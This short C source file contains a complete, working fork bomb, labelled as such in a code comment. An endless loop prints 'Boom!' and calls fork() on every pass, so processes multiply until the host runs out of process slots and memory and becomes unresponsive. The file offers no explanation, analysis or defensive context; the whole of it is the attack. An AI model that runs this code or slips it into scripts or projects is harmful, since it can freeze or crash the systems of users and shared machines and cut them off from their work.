#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void main() {
	// Starting a fork bomb
	while (1) {
        printf("Boom!\n");
		fork();
	}
}
